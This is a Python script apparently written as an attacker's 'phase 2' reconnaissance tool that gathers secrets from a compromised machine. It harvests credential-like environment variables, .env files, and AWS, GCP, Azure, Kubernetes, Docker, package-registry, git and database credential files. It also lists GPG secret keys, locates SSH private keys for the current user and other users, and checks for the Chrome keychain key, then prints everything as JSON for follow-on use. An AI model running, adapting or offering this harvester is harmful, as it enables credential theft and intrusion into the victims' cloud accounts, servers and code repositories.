#!/usr/bin/env python3
"""Phase 2 Situational Awareness — Full Environment Dump.
Extracts ALL environment variables, config files, secret stores,
GPG keys, cloud CLI configs, package manager configs, browser keychains.
Outputs structured JSON for follow-on processing."""

import os
import sys
import json
import glob
import re
import platform
from pathlib import Path

HOME = Path.home()
SYSTEM = platform.system()
RESULTS = {"host": os.uname().nodename, "user": os.environ.get("USER", "?"),
           "system": SYSTEM, "arch": platform.machine(), "sections": {}}

# ── 1. ALL Environment Variables ──
def dump_env_vars():
    env = dict(os.environ)
    secret_keys = [k for k in env if re.search(
        r'(?i)(key|secret|token|password|credential|auth|api|db_|database|redis|mongo|aws|azure|gcp|github|gitlab|slack|stripe|twilio|sendgrid|jwt|private)',
        k)]
    return {"total_vars": len(env), "secret_vars": {k: env[k] for k in secret_keys},
            "path_dirs": len(env.get("PATH", "").split(":")),
            "shell": env.get("SHELL"), "term": env.get("TERM"),
            "lang": env.get("LANG"), "home": env.get("HOME"),
            "ssh_auth_sock": env.get("SSH_AUTH_SOCK"),
            "display": env.get("DISPLAY"), "xdg_session": env.get("XDG_SESSION_TYPE")}

# ── 2. .env files (recursive scan) ──
def scan_env_files():
    results = []
    search_dirs = [HOME, Path("/opt"), Path("/var/www"), Path("/srv"),
                   HOME / "projects", HOME / "repos", HOME / "code",
                   HOME / "Desktop", HOME / "Documents"]
    for d in search_dirs:
        if not d.exists():
            continue
        try:
            for env_file in d.rglob(".env*"):
                if env_file.is_file() and env_file.stat().st_size < 100000:
                    try:
                        content = env_file.read_text(errors='replace')[:8000]
                        secrets = {}
                        for line in content.split("\n"):
                            line = line.strip()
                            if "=" in line and not line.startswith("#"):
                                k, _, v = line.partition("=")
                                k = k.strip()
                                v = v.strip().strip('"').strip("'")
                                if v and len(v) > 3:
                                    secrets[k] = v[:80]
                        if secrets:
                            results.append({"path": str(env_file), "vars": secrets})
                    except (PermissionError, OSError):
                        pass
        except (PermissionError, OSError):
            pass
    return results

# ── 3. Config files (all sensitive locations) ──
def scan_config_files():
    configs = {}
    targets = {
        "aws_credentials": HOME / ".aws" / "credentials",
        "aws_config": HOME / ".aws" / "config",
        "gcp_adc": HOME / ".config" / "gcloud" / "application_default_credentials.json",
        "gcp_properties": HOME / ".config" / "gcloud" / "properties",
        "azure_profile": HOME / ".azure" / "azureProfile.json",
        "azure_tokens": HOME / ".azure" / "accessTokens.json",
        "azure_clouds": HOME / ".azure" / "clouds.config",
        "kube_config": HOME / ".kube" / "config",
        "docker_config": HOME / ".docker" / "config.json",
        "npmrc": HOME / ".npmrc",
        "pypirc": HOME / ".pypirc",
        "pip_conf": HOME / ".pip" / "pip.conf",
        "pip_conf_alt": HOME / ".config" / "pip" / "pip.conf",
        "gem_credentials": HOME / ".gem" / "credentials",
        "composer_auth": HOME / ".composer" / "auth.json",
        "cargo_credentials": HOME / ".cargo" / "credentials",
        "nuget_config": HOME / ".nuget" / "NuGet.Config",
        "netrc": HOME / ".netrc",
        "git_credentials": HOME / ".git-credentials",
        "gitconfig": HOME / ".gitconfig",
        "ssh_config": HOME / ".ssh" / "config",
        "terraform_rc": HOME / ".terraformrc",
        "vault_token": HOME / ".vault-token",
        "consul_token": HOME / ".consul-token",
        "helm_repos": HOME / ".config" / "helm" / "repositories.yaml",
        "ansible_cfg": HOME / ".ansible.cfg",
        "ansible_vault": HOME / ".ansible" / "vault_password_file",
        "s3cmd_config": HOME / ".s3cfg",
        "rclone_config": HOME / ".config" / "rclone" / "rclone.conf",
        "minio_config": HOME / ".mc" / "config.json",
        "pgpass": HOME / ".pgpass",
        "my_cnf": HOME / ".my.cnf",
        "redis_conf": Path("/etc/redis/redis.conf"),
        "mongodb_conf": Path("/etc/mongod.conf"),
        "wrangler_toml": HOME / "wrangler.toml",
        "fly_toml": HOME / ".fly" / "config.yml",
        "heroku_auth": HOME / ".netrc",
    }
    for name, path in targets.items():
        if path.exists() and path.is_file():
            try:
                content = path.read_text(errors='replace')[:4000]
                configs[name] = {"path": str(path), "size": path.stat().st_size,
                                 "preview": content[:500]}
            except (PermissionError, OSError):
                configs[name] = {"path": str(path), "readable": False}
    return configs

# ── 4. GPG Keys ──
def scan_gpg_keys():
    gpg_dir = HOME / ".gnupg"
    if not gpg_dir.exists():
        return {"found": False}
    result = {"found": True, "files": []}
    key_files = ["pubring.kbx", "pubring.gpg", "secring.gpg", "trustdb.gpg",
                 "private-keys-v1.d"]
    for kf in key_files:
        p = gpg_dir / kf
        if p.exists():
            if p.is_dir():
                result["files"].append({"name": kf, "type": "dir",
                                        "count": len(list(p.iterdir()))})
            else:
                result["files"].append({"name": kf, "size": p.stat().st_size})
    # Try to list keys via gpg
    import subprocess
    try:
        proc = subprocess.run(["gpg", "--list-secret-keys", "--keyid-format", "long"],
                              capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            result["secret_keys"] = proc.stdout[:2000]
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return result

# ── 5. SSH Keys (comprehensive) ──
def scan_ssh_comprehensive():
    ssh_dir = HOME / ".ssh"
    if not ssh_dir.exists():
        return {"found": False}
    result = {"found": True, "keys": [], "agent": None, "config_hosts": []}
    for f in sorted(ssh_dir.iterdir()):
        if f.is_file():
            try:
                info = {"name": f.name, "size": f.stat().st_size,
                        "perms": oct(f.stat().st_mode & 0o777)}
                content = f.read_text(errors='replace')[:500]
                if "PRIVATE KEY" in content:
                    info["type"] = "private_key"
                    info["encrypted"] = "ENCRYPTED" in content
                    info["format"] = "RSA" if "RSA" in content else "ED25519" if "OPENSSH" in content else "other"
                elif f.name == "authorized_keys":
                    info["type"] = "authorized_keys"
                    info["entries"] = content.count("ssh-")
                elif f.name == "known_hosts":
                    info["type"] = "known_hosts"
                    info["entries"] = len([l for l in content.split("\n") if l.strip()])
                elif f.name == "config":
                    info["type"] = "config"
                    hosts = re.findall(r'Host\s+(.+)', content)
                    result["config_hosts"] = hosts
                result["keys"].append(info)
            except (PermissionError, OSError):
                pass
    agent_sock = os.environ.get("SSH_AUTH_SOCK")
    if agent_sock:
        result["agent"] = {"socket": agent_sock, "exists": os.path.exists(agent_sock)}
    # Also scan /root/.ssh and other users
    for user_home in [Path("/root")] + list(Path("/home").glob("*")):
        user_ssh = user_home / ".ssh"
        if user_ssh.exists() and user_ssh != ssh_dir:
            try:
                user_keys = [f.name for f in user_ssh.iterdir() if "PRIVATE" in f.read_text(errors='replace')[:100]]
                if user_keys:
                    result[f"user_{user_home.name}"] = user_keys
            except (PermissionError, OSError):
                pass
    return result

# ── 6. Browser Keychain / Credential Manager ──
def scan_keychain():
    result = {}
    if SYSTEM == "Darwin":
        import subprocess
        try:
            proc = subprocess.run(["security", "list-keychains"],
                                  capture_output=True, text=True, timeout=10)
            result["macos_keychains"] = [l.strip().strip('"') for l in proc.stdout.strip().split("\n") if l.strip()]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        # Check for Chrome Safe Storage key
        try:
            proc = subprocess.run(["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
                                  capture_output=True, text=True, timeout=5)
            result["chrome_key_available"] = proc.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
    elif SYSTEM == "Linux":
        # Check for gnome-keyring
        gnome_keyring = HOME / ".local" / "share" / "keyrings"
        if gnome_keyring.exists():
            result["gnome_keyring"] = [f.name for f in gnome_keyring.iterdir()]
        # KWallet
        kwallet = HOME / ".local" / "share" / "kwalletd"
        if kwallet.exists():
            result["kwallet"] = True
    return result

# ── Run all ──
try: RESULTS["sections"]["env_vars"] = dump_env_vars()
except Exception as e: RESULTS["sections"]["env_vars"] = {"error": str(e)}
try: RESULTS["sections"]["env_files"] = scan_env_files()
except Exception as e: RESULTS["sections"]["env_files"] = {"error": str(e)}
try: RESULTS["sections"]["config_files"] = scan_config_files()
except Exception as e: RESULTS["sections"]["config_files"] = {"error": str(e)}
try: RESULTS["sections"]["gpg_keys"] = scan_gpg_keys()
except Exception as e: RESULTS["sections"]["gpg_keys"] = {"error": str(e)}
try: RESULTS["sections"]["ssh"] = scan_ssh_comprehensive()
except Exception as e: RESULTS["sections"]["ssh"] = {"error": str(e)}
try: RESULTS["sections"]["keychain"] = scan_keychain()
except Exception as e: RESULTS["sections"]["keychain"] = {"error": str(e)}

print(json.dumps(RESULTS, indent=2, default=str))
print(f"\n[*] {len(RESULTS['sections'])} sections collected")
for k, v in RESULTS["sections"].items():
    if isinstance(v, dict) and "error" not in v:
        items = sum(1 for val in v.values() if val) if isinstance(v, dict) else 0
        print(f"  {k}: {items} items")
    elif isinstance(v, list):
        print(f"  {k}: {len(v)} entries")
    else:
        print(f"  {k}: {'error' if isinstance(v, dict) and 'error' in v else 'ok'}")

